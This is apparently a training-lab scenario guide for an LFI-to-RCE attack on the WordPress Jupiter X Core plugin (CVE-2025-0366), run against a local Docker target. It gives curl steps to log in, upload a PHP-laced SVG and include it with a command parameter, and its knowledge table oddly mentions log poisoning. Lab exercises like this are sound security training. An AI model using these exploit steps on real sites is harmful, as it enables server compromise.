# WEB-06: PHP LFI to RCE (Jupiter X Core)

## 场景信息

| 字段 | 值 |
|---|---|
| ID | WEB-06 |
| 名称 | PHP LFI to RCE (Jupiter X Core) |
| 技术/CVE | CVE-2025-0366 |
| 难度 | L2 |
| 交付方式 | Docker Compose |
| 入口 | localhost:10106 |

## 场景概述
- 技术：CVE-2025-0366
- 难度：L2
- 交付方式：docker
- 入口端口：10106
## 攻击路径与利用步骤

### Overview
| Property | Value |
|----------|-------|
| CVE | CVE-2025-0366 (CVSS 8.8) |
| Difficulty | L2 |
| Port | 10106 |
| Entry | contributor / Password123! |

### Attack Path
```
Login as Contributor → Upload malicious SVG with PHP → LFI to include SVG → RCE → /flag.txt
```

### Step-by-Step

```bash
# Step 1: Login as contributor
curl -c cookies.txt -X POST http://localhost:10106/wp-login.php \
  -d "log=contributor&pwd=Password123!"

# Step 2: Upload SVG with embedded PHP via Jupiter X Core
curl -b cookies.txt http://localhost:10106/wp-admin/admin-ajax.php \
  -F "action=jupiterx_upload" -F "file=@payload.svg"

# Step 3: Trigger LFI to include uploaded SVG
curl "http://localhost:10106/?file=../../../../wp-content/uploads/jupiterx/payload.svg&c=cat+/flag.txt"
# flag{web-06-xxxxxxxxxxxxxxxx}
```

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | WordPress/Jupiter X Core request routing and PHP file paths |
| 侦察与前置条件 | LFI parameter discovery and readable log/session path identification |
| 核心漏洞与利用 | Use local file inclusion and log/session poisoning to execute PHP |
| 权限、横向或影响 | Web-server command execution |
| 验证 | Read the flag from the resulting shell context |

## 修复建议
升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。

## Flag

完成上述利用后，读取场景返回的 `flag{...}` 值；可用 `scripts/verify-flag.sh` 验证捕获结果。
